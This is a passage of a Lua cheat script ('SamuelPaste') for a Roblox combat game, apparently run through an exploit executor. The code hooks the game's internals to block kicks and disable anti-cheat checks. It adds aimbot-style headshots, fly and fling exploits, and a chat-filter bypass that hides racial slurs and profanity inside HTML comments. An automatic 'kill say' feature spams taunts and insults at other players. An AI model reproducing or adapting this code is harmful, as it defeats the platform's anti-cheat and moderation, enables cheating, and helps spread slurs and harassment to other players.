   if typeof(v) == 'table' and rawget(v, 'kick') then
		v.kick = function() return wait(9e9) end
   end
   if typeof(v) == 'table' and rawget(v, 'randomDelayKick') then
		v.randomDelayKick = function() return wait(9e9) end
   end
   if typeof(v) == 'table' and rawget(v, 'connectCharacter') then
		v.connectCharacter = function(gg) return wait(9e9) end
   end
   if typeof(v) == "table" and rawget(v,"Remote") then
       v.Remote.Name = v.Name
   end
end
for i,v in pairs(getgc(true)) do
    if typeof(v) == 'table' then
        if rawget(v,'antiSpeed') then
            v.antiSpeed = {}
            v.antiBodyMover = {}
            v.antiInfJump = {}
            --print('sex')
        end
    end
end
local oldnamecall; oldnamecall = hookmetamethod(game, "__namecall", function(self, ...)
  local args = {...}
  local method = getnamecallmethod();
 
  if (method == "Kick" or method == "kick") and self == game.Players.LocalPlayer then
      return;
  end
    if self.Name == 'RangedHit' then
		if values.main['Ranged sector']['Always headshot'].Toggle then
			args[2] = args[2].Parent.Head
		end
    end
  return oldnamecall(self, unpack(args))
end)
	getgenv().rangedvalues = {}
for i,v in pairs(getgc(true)) do
	if typeof(v) == 'table' and rawget(v,'maxSpread') and rawget(v,'minSpread') then
--[[local function shallowCopy(original)
	local copy = {}
	for key, value in pairs(original) do
		copy[key] = value
	end
	return copy
end		
			pcall(function()
				table.clear(rangedvalues[string.lower(v.displayName)])
			end)--]]
			rangedvalues[string.lower(v.displayName)] = {
		['minSpread'] = v.minSpread,
		['maxSpread'] = v.maxSpread,
		['recoilXMin'] = v.recoilXMin,
		['recoilXMax'] = v.recoilXMax,
		['recoilYMin'] = v.recoilYMin,
		['recoilYMax'] = v.recoilYMax,
		['recoilZMin'] = v.recoilZMin,	
		['recoilZMax'] = v.recoilZMax,
		['startShootingAfterCharge'] = v.startShootingAfterCharge,
		['chargeOnDuration'] = v.chargeOnDuration,
		['chargeOffDuration'] = v.chargeOffDuration,
		['gravity'] = v.gravity,
		['maxDistance'] = v.maxDistance,
			}
			--rangedvalues[string.lower(v.displayName)] = shallowCopy(v)
			--table.freeze(rangedvalues[string.lower(v.displayName)])
			--shit didnt work properly fuck u whoever reads that
		--print(rangedvalues[string.lower(v.displayName)].displayName)
	end
end


for i,v in pairs(getgc(true)) do
	if type(v) == 'table' and rawget(v,'cancelReload') then
		task.spawn(function()
			oldReload = v.cancelReload
			game.RunService.RenderStepped:Connect(function()
				pcall(function()
					if values.main['Ranged sector']['No reload cancel'].Toggle then
						v.cancelReload = function(...)
							return
						end
					else
						v.cancelReload = oldReload
					end
				end)
			end)
		end)
	end
end
--local Players = game:GetService("Players")
--local LocalPlayer = Players.LocalPlayer
--local Mouse = LocalPlayer:GetMouse()
local flyKeyDown
local flyKeyUp
local events = game:GetService("ReplicatedStorage").Communication.Events
local functions = game:GetService("ReplicatedStorage").Communication.Functions

--functions.SpawnCharacter:FireServer()
--wait(0.5)
for i = 1,10 do -- inf jump bypass
    events.StartFastRespawn:FireServer()
    functions.CompleteFastRespawn:FireServer()
    wait(.1)
end
print('sex')
local weapon_anims = {}

for i,v in pairs(game:GetService("ReplicatedStorage").Shared.Assets.Melee:GetDescendants()) do
    if v:IsA("Animation") then
        if v.Name:find("Slash") or v.Name:find("Swing") then
            table.insert(weapon_anims,v.AnimationId)
        end
    end
end
FLYING = false
iyflyspeed = 1
vehicleflyspeed = 1
--local Players = game:GetService("Players")
--local LocalPlayer = Players.LocalPlayer

local function GetClosest(Distance,arg2)
    local Character = LocalPlayer.Character
    local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
    if not (Character or HumanoidRootPart) then return end

    local TargetDistance = Distance
    TargetHealth = 101
    local Target

    for i,v in ipairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChildWhichIsA('Humanoid').Health > 0 and LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid').Health > 0 then
            local TargetHRP = v.Character.HumanoidRootPart
            local mag = (HumanoidRootPart.Position - TargetHRP.Position).magnitude
            if arg2 == 'Health' then
               if mag < TargetDistance and v.Character.Humanoid.Health < TargetHealth then
                   TargetHealth = v.Character.Humanoid.Health
                   Target = v
                end
            else
                if mag < TargetDistance then
                    TargetDistance = mag
                    Target = v
                end
            end
			if values.main.combat['Target player'].Toggle and v.Name == values.main.combat['Target'].Dropdown then
				return v
			end
        end
    end

    return Target
end
--[[local function GetClosest(Distance)
    local Character = LocalPlayer.Character
    local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
    if not (Character or HumanoidRootPart) then return end

    local TargetDistance = Distance
    local Target

    for i,v in ipairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
            local TargetHRP = v.Character.HumanoidRootPart
            local mag = (HumanoidRootPart.Position - TargetHRP.Position).magnitude
            if mag < TargetDistance then
                TargetDistance = mag
                Target = v
            end
        end
    end

    return Target
end
--]]
 function sFLY(vfly,ragdoll,platform)
     if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
     local T = LocalPlayer.Character.HumanoidRootPart
     local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
     local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
     local SPEED = 0
 
     local function FLY()
         FLYING = true
         local BG = Instance.new('BodyGyro')
         local BV = Instance.new('BodyVelocity')
         BG.P = 9e4
         BG.Parent = T
         BV.Parent = T
         BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
         BG.cframe = T.CFrame
         BV.velocity = Vector3.new(0, 0, 0)
         BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
         task.spawn(function()
             repeat wait()
                 if LocalPlayer.Character.Humanoid:FindFirstChild("RagdollRemoteEvent") ~= nil then
                     if ragdoll then
                        LocalPlayer.Character.Humanoid:FindFirstChild("RagdollRemoteEvent"):FireServer(true)
                     end
                 end
                 for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if v:IsA("BallSocketConstraint") then
                         v.TwistLowerAngle = 0
                         v.TwistUpperAngle = 0
                         v.UpperAngle = 0
                         v.Radius = 0
                         if v.Parent.Name == "Right Arm" or v.Parent.Name == "Left Arm" then
                             v.TwistLowerAngle = 0
                             v.TwistUpperAngle = 0
                             v.UpperAngle = 90
                             v.Radius = 90
                         end
                     end
                 end
                 if not vfly and LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
                     LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = platform
                 end
                 if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
                     SPEED = 50
                 elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
                     SPEED = 0
                 end
                 if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
                     BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
                     lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
                 elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
                     BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
                 else
                     BV.velocity = Vector3.new(0, 0, 0)
                 end
                 BG.cframe = workspace.CurrentCamera.CoordinateFrame
             until not FLYING
             CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
             lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
             SPEED = 0
             BG:Destroy()
             BV:Destroy()
             if LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
                 LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
             end
         end)
     end
     flyKeyDown = Mouse.KeyDown:Connect(function(KEY)
         if KEY:lower() == 'w' then
             CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
         elseif KEY:lower() == 's' then
             CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
         elseif KEY:lower() == 'a' then
             CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
         elseif KEY:lower() == 'd' then 
             CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
         elseif QEfly and KEY:lower() == 'e' then
             CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
         elseif QEfly and KEY:lower() == 'q' then
             CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
         end
         pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
     end)
     flyKeyUp = Mouse.KeyUp:Connect(function(KEY)
         if KEY:lower() == 'w' then
             CONTROL.F = 0
         elseif KEY:lower() == 's' then
             CONTROL.B = 0
         elseif KEY:lower() == 'a' then
             CONTROL.L = 0
         elseif KEY:lower() == 'd' then
             CONTROL.R = 0
         elseif KEY:lower() == 'e' then
             CONTROL.Q = 0
         elseif KEY:lower() == 'q' then
             CONTROL.E = 0
         end
     end)
     FLY()
	 local somethingidk = C.INST('BoolValue',LocalPlayer.Character)
	 somethingidk.Name = 'isFlyingCheck'
 end
 
 invisfling = function()
 local plr = game.Players.LocalPlayer
 local oldHumanoid = plr.Character.Humanoid
 local torso = game.Players.LocalPlayer.Character.HumanoidRootPart
 local mouse = plr:GetMouse()
 local flying = true
 local deb = true
 local ctrl = {f = 0, b = 0, l = 0, r = 0}
 local lastctrl = {f = 0, b = 0, l = 0, r = 0}
 local maxspeed = 50
 local speed = 50
 
 workspace.CurrentCamera.CameraSubject = torso
 
 
 ---local bambam = Instance.new("BodyThrust")
 ---bambam.Parent = torso
 --bambam.Force = Vector3.new(9999999,0,9999999)
 --bambam.Location = torso.Position
 
 
 ---
 function Fly()
 --game.Players.LocalPlayer.Character.Humanoid.RagdollRemoteEvent:FireServer(false)
 local bambam = Instance.new("BodyThrust")
 bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
 bambam.Force = Vector3.new(99999,0,99999)
 bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position 
 Instance.new("SelectionBox",game.Players.LocalPlayer.Character.HumanoidRootPart).Adornee = game.Players.LocalPlayer.Character.HumanoidRootPart
 local bg = Instance.new("BodyGyro", torso)
 bg.P = 9e4
 bg.maxTorque = Vector3.new(0, 0, 0)
 bg.cframe = torso.CFrame
 local bv = Instance.new("BodyVelocity", torso)
 bv.velocity = Vector3.new(0,0,0)
 bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
 repeat wait()
 if oldHumanoid:FindFirstChildOfClass'RemoteEvent' ~= nil then
     oldHumanoid.RagdollRemoteEvent:FireServer(true)
 end
 game.ReplicatedStorage.Communication.Events.UpdateIsCrouching:FireServer(true)
 
 if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
 speed = speed+.2
 if speed > maxspeed then
 speed = maxspeed
 end
 elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
 speed = speed-1
 if speed < 0 then
 speed = 0
 end
 end
 if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
 bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
 lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
 elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
 bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
 else
 bv.velocity = Vector3.new(0,0.1,0)
 end
 
 until not flying
 ctrl = {f = 0, b = 0, l = 0, r = 0}
 lastctrl = {f = 0, b = 0, l = 0, r = 0}
 speed = 0
 bg:Destroy()
 bv:Destroy()
 
 end
 mouse.KeyDown:connect(function(key)
 if key:lower() == "w" then
 ctrl.f = 1
 elseif key:lower() == "s" then
 ctrl.b = -1
 elseif key:lower() == "a" then
 ctrl.l = -1
 elseif key:lower() == "d" then
 ctrl.r = 1
 end
 end)
 mouse.KeyUp:connect(function(key)
 if key:lower() == "w" then
 ctrl.f = 0
 elseif key:lower() == "s" then
 ctrl.b = 0
 elseif key:lower() == "a" then
 ctrl.l = 0
 elseif key:lower() == "d" then
 ctrl.r = 0
 elseif key:lower() == "r" then
 
 end
 end)
 for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
     v:Destroy()
 end
 wait(.1)
 oldHumanoid.RagdollRemoteEvent:FireServer(true)
 wait(.5)
 coroutine.wrap(Fly)()
 wait(.5)
 game.Players.LocalPlayer.Character.HumanoidRootPart.RootJoint.Part0 = nil
 end

local gui = library:New("SamuelPaste")
local main = gui:Tab('main')
local misc = gui:Tab('misc')
--local visuals = gui:Tab('visuals')
local other = gui:Tab("other")
print('sex2')
fonts = {}
for i,v in pairs(Enum.Font:GetEnumItems()) do
	if v.Name ~= 'Unknown' then
		table.insert(fonts,v.Name)
	end
end
do
for a,b in next, getgc(true) do
    if typeof(b) == 'table' and rawget(b, 'removeRichTextTags') then
        replaceclosure(rawget(b, 'removeRichTextTags'), function(a)
            return a
        end)
    end
end
local chat = main:Sector('chat', 'Right')
--chat:Element('ToggleColor','custom tag')
--chat:Element('ToggleColor','custom nickname')
chat:Element('ToggleColor','custom text color')

--chat:Element('TextBox', 'tag',{placeholder = "custom tag"})
--chat:Element('TextBox', 'nickname',{placeholder = "custom nickname"})

chat:Element('Toggle','custom message size')
chat:Element('Slider','size', {min = 1, max = 100})
chat:Element('Toggle', 'custom font')


chat:Element('Dropdown', 'message font',{options = fonts})
	local chatmessages_pasteed = {
		"Lost to SamuelPaste? Who woulda thought",
		"what was that? Can't hear u over my kill sound",
		"he swings! and he misses",
		--"I think im hvhing a homeless person",
		"SamuelPaste is pasted did you know?",
		"This hack is approved by Y1K and len",
		"fun fact: this person is using SamuelPaste",
		"oww, thats gonna leave a bruise in the morning",
		"this is a tough workout!",
		--"New years resolution: Keep clapping kids",
		"No way you're this bad?",
		--"Are you a chimney? Coz Im santa claus...",
		--"Looks like you got coal for christmas",
		"Are you a train? Coz you're getting railed rn",
		--"You and ur mom are very similar, coz both of u are getting raped"
		"你是垃圾，菜鸟可以做得更好。",
		"imagine dying 😅😅😅 LLLL",
		"Oops i forgot you were there, oh wait you actually dont exist anyways.",
		"ez ez you got clapped by a low level haha!",
		"🤓: you cant just exploit in here!!111!!111 its illegal!!!!",
		"why are you dying to me bro fr fr",
		"clapped by SamuelPaste user :skull:",
		"bro got clapped lol",
		"'🤓: imagine being fatherless'  where are yours then go check 😁😁😁",
		"sorry did my kill aura hit you? if so then youre trash 😅",
		"bro got skill issues 😅😅😅",
		"bozo cant even beat me",
		"fr fr SamuelPaste on top",
		"What's up 'Hackle cheatle' here guys, I have been arresting due to multiple crimes including cheating.",
		"wdym touch grass i have one of those on my feet",
		"fortnite 19$ gift card who wants it!!!??",
		--".gg/gswH7FGxyb <-- join for cool scripts (!!! real no fake !!!)",
		"ez bozo",
		"your dad never came back from the milk store for a reason",
		"damn bro did your mother drop you when youre born",
		"Who are you talking to? a kill say bot? 😅",
		"damn bro you really need a therapist 😅😅",
		"🤓: stop hacking!!!! its against the rules!!!",
		"wenomechainsama tumajarbisaun",
		"you should go back to kindergarden bro 😂",
		"im just better than you!!!!!",
		"SamuelPaste better than you smh smh smh 😅"		
	}




	--local number = 0
	--local femboy = 1
	--local customchatspam = 0
	--local killsaymessages = readfile('SamuelPaste_cw/customkillsay.txt'):split('\n', '')
	chat:Element('Toggle','No tags')
	chat:Element('Dropdown','No tags method',{options = {'main','1','2'}})
	chat:Element('Dropdown','Main no tags method', {options = {'in script','custom file'}})
	
	randomtable = {
    --['uck'] = "<!--ireflies are y-->uck<!--'y and disgut'-->",
    ['tch'] = "<!--ngo and ill dit-->tch",
    ['hit'] = "<!--ireflies are y--><!--'y and disgut'-->hit",
    ['ic'] = "<!--ireflies are y-->ic<!--'y and disgut'-->",
    ['rnhub'] = "<!--ireflies are y-->rnhub<!--'y and disgut'-->",
    ['tard'] = "<!--ireflies are y--><!--'y and disgut'-->tard",
    ['orn'] = "<!--ireflies are y--><!--'y and disgut'-->orn",
	['gg'] = "<!--ireflies are y--><!--'y and disgut'-->gger",
    ['orn'] = "<!--ireflies are y--><!--'y and disgut'-->orn",
    ['ss'] = "<!--ireflies are y--><!--'y and disgut'-->ss",
    ['x'] = "<!--ireflies are y--><!--'y and disgut'-->x",
    ['ll'] = "<!--ireflies are y--><!--'y and disgut'-->ll",
    ['self'] = "<!--ireflies are y--><!--'y and disgut'-->self",
	
    ['UC'] = "<!--ireflies are y-->UC<!--'y and disgut'-->",
    ['U'] = "<!--ireflies are y--><!--'y and disgut'-->U",
    ['hu'] = "<!--ireflies are y--><!--'y and disgut'-->hu",
    ['um'] = "<!--ireflies are y--><!--'y and disgut'-->um",
    ['TCH'] = "<!--ireflies are y--><!--'y and disgut'-->TCH",
    ['HIT'] = "<!--ireflies are y--><!--'y and disgut'-->HIT",
    ['RD'] = "<!--ireflies are y-->RD<!--'y and disgut'-->",
    ['rd'] = "<!--ireflies are y-->rd<!--'y and disgut'-->",
    ['tf'] = "<!--ireflies are y-->tf<!--'y and disgut'-->",
    ['oo'] = "<!--ireflies are y-->oo<!--'y and disgut'-->",
    ['ak'] = "<!--ireflies are y-->ak<!--'y and disgut'-->",
    --['rn'] = "<!--ireflies are y--><!--'y and disgut'-->rn",
    ['rn'] = "<!--ireflies are y-->rn<!--'y and disgut'-->",
    ['en'] = "<!--ireflies are y-->en<!--'y and disgut'-->",
    ['ck'] = "<!--ireflies are y-->ck<!--'y and disgut'-->",
    --['na'] = "<!--ireflies are y-->na<!--'y and disgut'-->",
    ['it'] = "<!--ireflies are y-->it<!--'y and disgut'-->",
    --['we'] = "<!--ireflies are y-->we<!--'y and disgut'-->",
    ['en'] = "<!--ireflies are y-->en<!--'y and disgut'-->",
    ['ck'] = "<!--ireflies are y-->ck<!--'y and disgut'-->",
    ['na'] = "<!--ireflies are y-->na<!--'y and disgut'-->",
    --['it'] = "<!--ireflies are y-->it<!--'y and disgut'-->",
    ['we'] = "<!--ireflies are y-->we<!--'y and disgut'-->"
	
}
local CensoredTables1 = {
    ['uc'] = {
        FULLWORD = {
            ['fuck'] = 1
        },
        METHOD = 2
    },
    ['gg'] = {
        FULLWORD = {
            ['nigga'] = 1,
            ['nigger'] = 2
        },
        METHOD = 1
    },
    ['hit'] = {
        FULLWORD = {
            ['hitler'] = 1
        },
        METHOD = 1
    },
    -- METHOD TWO MUST BE DOWN IN ORDER TO PREVENT OTHER TO ERROR
    ['rs'] = {
        FULLWORD = {
            ['niggers'] = 1
        },
        METHOD = 2
    },
    ['ss'] = {
        FULLWORD = {
            ['pussy'] = 1,
			['ass'] = 2
        },
        METHOD = 2
    },
    ['rn'] = {
        FULLWORD = {
            ['horny'] = 1
        },
        METHOD = 3
    },
    ['rd'] = {
        FULLWORD = {
            ['retard'] = 1
        },
        METHOD = 1
    },
    ['gi'] = {
        FULLWORD = {
            ['vagina'] = 1
        },
        METHOD = 1
    },
    ['x'] = {
        FULLWORD = {
            ['sex'] = 1
        },
        METHOD = 2
    },
	['ao'] = {
		FULLWORD = {
			['lmao'] = 1,
			['lmfao'] = 2,
		},
		METHOD = 4
	}
}
function CheckIfIsInTable(Word)
    --print(Word)
	if values.main.chat['Main no tags method'].Dropdown == 'in script' then
		CensoredTables = CensoredTables1
	else
		loadstring('CensoredTables = { '..readfile('SamuelPaste_cw/customantitags.txt')..'}')
	end
    for i,v in pairs(CensoredTables) do
        for g,e in pairs(v.FULLWORD) do
            if string.find(Word:lower(),g) then
                if Word:upper():find(g:upper()) or Word:upper() == g:upper() then
                    if Word == string.upper(Word) then
                        return {toGsub = i,IsCap = true}
                    end
                end
                return {toGsub = i,IsCap = false}
            end
        end
    end
end
function bypass(Word)
    local ReturnWord = ""
    local Caps = false
    local Method
	
	if values.main.chat['Main no tags method'].Dropdown == 'in script' then
		CensoredTables = CensoredTables1
	else
		loadstring('CensoredTables = { '..readfile('SamuelPaste_cw/customantitags.txt')..'}')
	end	
	
    for oi,v in pairs(CensoredTables) do
        local Check = CheckIfIsInTable(Word)
        if Check then
            local i = Check.toGsub
            --print('hi')
            if Check.IsCap == true then
                Caps = true
            end
            local NewV = ""
            if v.METHOD == 1 then
                if Caps then
                    NewV = "<!--ireflies are y-->"..i:upper().."<!--'y and disgut'-->"
                else
                    NewV = "<!--ireflies are y-->"..i.."<!--'y and disgut'-->"
                end
            elseif v.METHOD == 2 then
                if Caps then
                    NewV = "<!--ireflies are y--><!--'y and disgut'-->"..i:upper()
                else
                    NewV = "<!--ireflies are y--><!--'y and disgut'-->"..i
                end
            elseif v.METHOD == 3 then
                if Caps then
                    NewV = i:upper().."<!--ireflies are y--><!--'y and disgut'-->"
                else
                    NewV = i.."<!--ireflies are y--><!--'y and disgut'-->"
                end
            elseif v.METHOD == 4 then
                print(NewV)
				if Caps then
					NewV = "<!--o m g -->"..i:upper()
				else
					NewV = "<!--o m g -->"..i
				end
				print(NewV)
			end
            if not Caps and NewV then
                ReturnWord = Word:gsub(i,NewV)
                --print(ReturnWord)
            elseif Caps and NewV then
                ReturnWord = Word:gsub(i:upper(),NewV)
            end
        end
    end
    if ReturnWord then
        return ReturnWord
    else
        return Word
    end
end

--[[game:GetService("TextChatService").OnIncomingMessage = function(L)
    if L.TextSource and tonumber(L.TextSource.UserId) == game:FindService("Players").LocalPlayer.UserId then
        local Bypassed = bypass(L.Text)
        if Bypassed == "" or Bypassed == nil then
        else
            L.Text = Bypassed
        end
    end
    --end
end--]]

fire = false

	chat:Element("Toggle", "kill say")
	chat:Element("Dropdown", "kill say type", {options = {"message", "random", "custom file"}})
	chat:Element('Dropdown', 'custom file type', {options = {'1,2,3 etc.', 'random'}})
	chat:Element("TextBox", "message", {placeholder = "message"})
	chat:Element('Button','Clean chat',{}, function()
	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\na")
	end)
	killsaysignal = Signal.new('killsaysignal')
	killsaysignal:Connect(function()
		if values.main.chat["kill say"].Toggle then 
			if values.main.chat["kill say type"].Dropdown == "default" then
				game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(
					values.main.chat["message"].Text ~= "" 
					and values.main.chat["message"].Text or "L bro cant win the pasted script"
				)
			elseif values.main.chat['kill say type'].Dropdown == 'random' then
			game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(
				chatmessages_pasteed[math.random(#chatmessages_pasteed)]
			)
			else
				
				local messages = readfile('SamuelPaste/customkillsay.txt'):split('\n', '')
				if values.main.chat['custom file type'].Dropdown == 'random' then
					game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(
						messages[math.random(#messages)]
					)	
				else
					game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(
						messages[customtypemessagesnumber]
					)
					customtypemessagesnumber = customtypemessagesnumber + 1
					if customtypemessagesnumber == (#messages + 1) then
					customtypemessagesnumber = 1
					end
				end
			end
		end
	end)
	for i,v in pairs(getgc(true)) do
		if typeof(v) == 'table' then
			if rawget(v,'removeKillFeedIdx') and rawget(v,'render') then
				print('found')
				oldrender = v.render
				v.render = function(sex1)
							if sex1.props.killfeedItemInfo.playerThatKilled == LocalPlayer and sex1.props.killfeedItemInfo.playerThatDied ~= LocalPlayer then
								killsaysignal:Fire()
							end
					return oldrender(sex1)
				end
			end
		end
	end	
	
function toInteger(color)
	return C.FLOOR(color.r*255)*256^2+C.FLOOR(color.g*255)*256+C.FLOOR(color.b*255)
end

function toHex(color)
	local int = toInteger(color)
	
	local current = int
	local final = ""
	
	local hexChar = {
		"A", "B", "C", "D", "E", "F"
	}
	
	repeat local remainder = current % 16
		local char = tostring(remainder)
		
		if remainder >= 10 then
			char = hexChar[1 + remainder - 10]
		end
		
		current = C.FLOOR(current/16)
		final = final..char
	until current <= 0
	if string.len(final) == 4 then
		final = final..'00'
	end
	return "#"..string.reverse(final)
end

local edited = false
--local oldIncomingMessage = game:GetService("TextChatService").OnIncomingMessage
			game:GetService("TextChatService").OnIncomingMessage = function(L)
				if L.TextSource and L.TextSource.UserId == game.Players.LocalPlayer.UserId then
					if values.main.chat['No tags'].Toggle then
						if values.main.chat['No tags method'].Dropdown == '1' then
							if L.TextSource and tonumber(L.TextSource.UserId) == game:FindService("Players").LocalPlayer.UserId then 
								for i,v in next, randomtable do
									L.Text =  L.Text:gsub(i,v)
								end
							end
						elseif values.main.chat['No tags method'].Dropdown == '2' then
							if fire == false and L.TextSource and tonumber(L.TextSource.UserId) == game:FindService("Players").LocalPlayer.UserId then 
								fire = true
								message = L.Text:split('')
								l = ''
								for i,v in next,message do
									l = l.."<!--o m g -->"..v
								end
								L.Text = l
							elseif L.TextSource and L.TextSource.UserId == game.Players.LocalPlayer.UserId then
								fire = false
							end        
						else
							local Bypassed = bypass(L.Text)
							if Bypassed == "" or Bypassed == nil then
							else
								L.Text = Bypassed
							end
						end
					end					
					if edited == false and (values.main.chat['custom text color'].Toggle or values.main.chat['custom message size'].Toggle or values.main.chat['custom font'].Toggle) then --or values.main.chat['custom tag'].Toggle or values.main.chat['custom nickname'].Toggle) then
						--[[oldPrefixText = L.PrefixText
						customTag = ""
						if values.main.chat['custom tag'].Toggle then
							customTagFont = 1
							customTag = ''
							customTag = string.gsub(customTag, '<font color = #01a2ff>', '')
							--print(customtTag)
							
							customTag = customTag..'<font color = '..'\"'..toHex(values.main.chat['custom tag'].Color)..'\">'
							--print(L.PrefixText)
							
							if values.main.chat['custom message size'].Toggle then
								customTag = customTag..'<font size = '..'\"'..values.main.chat.size.Slider..'\">'
								customTagFont += 1
								--print(L.PrefixText)
							end
							if values.main.chat['custom font'].Toggle then
								customTag = customTag..'<font face = '..'\"'..values.main.chat['message font'].Dropdown..'\">'
								customTagFont += 1
								--print(L.PrefixText)
							end
							--print(L.PrefixText)
							
							customTag = customTag..'['..values.main.chat.tag.Text..']'..(string.rep('</font>',customTagFont))
							--print(customtTag)
						end
						if values.main.chat['custom nickname'].Toggle then
							customNickname = 1	
							--print(L.PrefixText)
							L.PrefixText = customTag..'<font color = '..'\"'..toHex(values.main.chat['custom nickname'].Color)..'\">'
							
							if values.main.chat['custom message size'].Toggle then
								L.PrefixText = L.PrefixText..'<font size = '..'\"'..values.main.chat.size.Slider..'\">'
								customNickname += 1	
							end
							if values.main.chat['custom font'].Toggle then
								L.PrefixText = L.PrefixText..'<font face = '..'\"'..values.main.chat['message font'].Dropdown..'\">'
								customNickname += 1	
							end
							L.PrefixText = L.PrefixText..values.main.chat.nickname.Text..(string.rep('</font>', customNickname))	
							--print(L.PrefixText)			
						else
							L.PrefixText = customTag..L.PrefixText
						end--]]
						text = L.Text
						if values.main.chat['custom text color'].Toggle or values.main.chat['custom message size'].Toggle or values.main.chat['custom font'].Toggle then
							customText = 0
							--L.Text = '<font '
							
							L.Text = ''
							text2 = ''
								if values.main.chat['custom text color'].Toggle then
								text2 = '<font color = '..'\"'..toHex(values.main.chat['custom text color'].Color)..'\">'
								
								customText += 1
								end
								if values.main.chat['custom message size'].Toggle then
								text2 = text2..'<font size = '..'\"'..values.main.chat.size.Slider..'\">'
								customText += 1
								end
								if values.main.chat['custom font'].Toggle then
									text2 = text2..'<font face = '..'\"'..values.main.chat['message font'].Dropdown..'\">'
									customText += 1
								end
							L.Text = text2..text..(string.rep('</font>', customText))
						end
						edited = true
					else
					edited = false
					end
				end
			end
end

function parry()
    game:GetService("ReplicatedStorage").Communication.Events.Parry:FireServer()
end
do
local combat = main:Sector('combat', 'Left')
  -- local combat = main:Sector("combat")
    local Autos = main:Sector("Autos", "Right")
    local Misc = main:Sector("Misc", "Right")
